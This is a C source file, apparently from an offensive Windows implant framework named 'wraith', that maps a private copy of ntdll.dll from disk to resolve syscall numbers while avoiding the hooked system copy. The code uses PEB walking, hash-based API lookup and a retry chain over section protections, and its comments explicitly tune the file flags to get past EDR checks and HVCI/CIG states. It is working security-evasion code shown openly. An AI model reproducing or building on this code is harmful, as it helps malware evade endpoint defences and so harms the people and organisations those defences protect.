/*
 * src/stealth/private_ntdll/private_ntdll.c
 *
 * Implementation. The mapping is performed entirely through direct
 * function pointers resolved via PEB walk + the hash-based resolver -
 * we deliberately avoid going through the Hell's Hall syscall engine
 * here so there's no circular dependency between this module and
 * sc_engine_init (the engine can later opt to use the private base
 * for its own SSN resolution).
 *
 * Wine note: wine 9.0 does support `NtCreateSection(SEC_IMAGE)` on
 * ntdll.dll itself. The kernel doesn't dedupe by file handle, so a
 * fresh map ends up at an ASLR-picked base distinct from the OS-loaded
 * ntdll - exactly what we need for SSN resolution.
 */

#include "runtime/rt_pebwalk.h"
#include "runtime/rt_resolver.h"
#include "stealth/hashing/hash_djb2.h"
#include "stealth/private_ntdll/private_ntdll.h"

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <windows.h>
#include <winternl.h>

#ifndef SEC_IMAGE
#  define SEC_IMAGE 0x01000000
#endif
#ifndef SECTION_ALL_ACCESS
#  define SECTION_ALL_ACCESS 0xF001F
#endif
#ifndef ViewUnmap
#  define ViewUnmap 2
#endif

/* Direct ntdll function-pointer types. Resolved on first init and
 * cached - we don't want to walk exports per-call. */
typedef NTSTATUS (NTAPI *fn_NtCreateSection)(
  PHANDLE, ULONG, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *fn_NtMapViewOfSection)(
  HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER,
  PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI *fn_NtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *fn_NtClose)(HANDLE);

static struct {
  HANDLE  file;
  HANDLE  section;
  void  *base;
  size_t  size;
  fn_NtCreateSection  pNtCreateSection;
  fn_NtMapViewOfSection  pNtMapViewOfSection;
  fn_NtUnmapViewOfSection pNtUnmapViewOfSection;
  fn_NtClose  pNtClose;
} g_priv = { INVALID_HANDLE_VALUE, NULL, NULL, 0, NULL, NULL, NULL, NULL };

static wraith_status_t resolve_direct_pointers(void)
{
  void *ntdll = NULL;
  wraith_status_t rc = wr_pebwalk_find_module(wr_djb2_a("ntdll.dll"),
  &ntdll);
  if (rc != WRAITH_OK || !ntdll) {
  return WRAITH_E_RT_PEB_WALK_FAILED;
  }
  void *p = NULL;
  if (wr_resolver_lookup_a(ntdll, "NtCreateSection", &p) != WRAITH_OK) {
  return WRAITH_E_RT_API_NOT_RESOLVED;
  }
  g_priv.pNtCreateSection = (fn_NtCreateSection)p;

  if (wr_resolver_lookup_a(ntdll, "NtMapViewOfSection", &p) != WRAITH_OK) {
  return WRAITH_E_RT_API_NOT_RESOLVED;
  }
  g_priv.pNtMapViewOfSection = (fn_NtMapViewOfSection)p;

  if (wr_resolver_lookup_a(ntdll, "NtUnmapViewOfSection", &p) != WRAITH_OK) {
  return WRAITH_E_RT_API_NOT_RESOLVED;
  }
  g_priv.pNtUnmapViewOfSection = (fn_NtUnmapViewOfSection)p;

  if (wr_resolver_lookup_a(ntdll, "NtClose", &p) != WRAITH_OK) {
  return WRAITH_E_RT_API_NOT_RESOLVED;
  }
  g_priv.pNtClose = (fn_NtClose)p;
  return WRAITH_OK;
}

wraith_status_t wr_private_ntdll_init(void)
{
  if (g_priv.base) {
  return WRAITH_OK;
  }
  wraith_status_t rc = resolve_direct_pointers();
  if (rc != WRAITH_OK) {
  return rc;
  }

  wchar_t path[MAX_PATH];
  UINT n = GetSystemDirectoryW(path, (UINT)(sizeof(path) /
  sizeof(path[0])));
  if (n == 0 ||
  n + wcslen(L"\\ntdll.dll") + 1 >= sizeof(path) / sizeof(path[0])) {
  return WRAITH_E_UNEXPECTED;
  }
  wcscat(path, L"\\ntdll.dll");

  /* No FILE_SHARE_DELETE: some EDRs reject SEC_IMAGE creation when
  * the file handle was opened with share-delete. */
  g_priv.file = CreateFileW(path,
  GENERIC_READ | GENERIC_EXECUTE,
  FILE_SHARE_READ,
  NULL, OPEN_EXISTING,
  FILE_ATTRIBUTE_NORMAL, NULL);
  if (g_priv.file == INVALID_HANDLE_VALUE) {
  return WRAITH_E_UNEXPECTED;
  }

  /* DesiredAccess: SECTION_ALL_ACCESS (canonical). Walk a retry
  * chain over SectionPageProtection because the accepted value
  * varies by Windows version + HVCI/CIG state on Win11 24H2.
  * See map_phantom.c for the same pattern + rationale. */
  static const ULONG kProtAttempts[] = {
  PAGE_READONLY,
  PAGE_EXECUTE,
  PAGE_EXECUTE_READ,
  PAGE_EXECUTE_WRITECOPY,
  };
  NTSTATUS s = (NTSTATUS)0xC00000F4;
  for (size_t pi = 0; pi < sizeof(kProtAttempts) / sizeof(kProtAttempts[0]); ++pi) {
  s = g_priv.pNtCreateSection(
  &g_priv.section, SECTION_ALL_ACCESS, NULL, NULL,
  kProtAttempts[pi], SEC_IMAGE, g_priv.file);
  if (s == 0) break;
  if ((unsigned)s != 0xC00000F4u) break;
  }
  if (s != 0) {
  CloseHandle(g_priv.file);
  g_priv.file = INVALID_HANDLE_VALUE;
  return WRAITH_E_MAP_RESERVE_FAILED;
  }

  void  *base = NULL;
  SIZE_T  view_sz = 0;
  s = g_priv.pNtMapViewOfSection(
  g_priv.section, (HANDLE)-1, &base, 0, 0, NULL, &view_sz,
  ViewUnmap, 0, PAGE_EXECUTE_READ);
  if (s != 0 || !base) {
  g_priv.pNtClose(g_priv.section);
  g_priv.section = NULL;
  CloseHandle(g_priv.file);
  g_priv.file = INVALID_HANDLE_VALUE;
  return WRAITH_E_MAP_RESERVE_FAILED;
  }
  g_priv.base = base;
  g_priv.size = (size_t)view_sz;
  return WRAITH_OK;
}

void *wr_private_ntdll_get_base(void)
{
  return g_priv.base;
}

size_t wr_private_ntdll_get_size(void)
{
  return g_priv.size;
}

void wr_private_ntdll_release(void)
{
  if (g_priv.base && g_priv.pNtUnmapViewOfSection) {
  g_priv.pNtUnmapViewOfSection((HANDLE)-1, g_priv.base);
  g_priv.base = NULL;
  g_priv.size = 0;
  }
  if (g_priv.section && g_priv.pNtClose) {
  g_priv.pNtClose(g_priv.section);
  g_priv.section = NULL;
  }
  if (g_priv.file != INVALID_HANDLE_VALUE) {
  CloseHandle(g_priv.file);
  g_priv.file = INVALID_HANDLE_VALUE;
  }
}
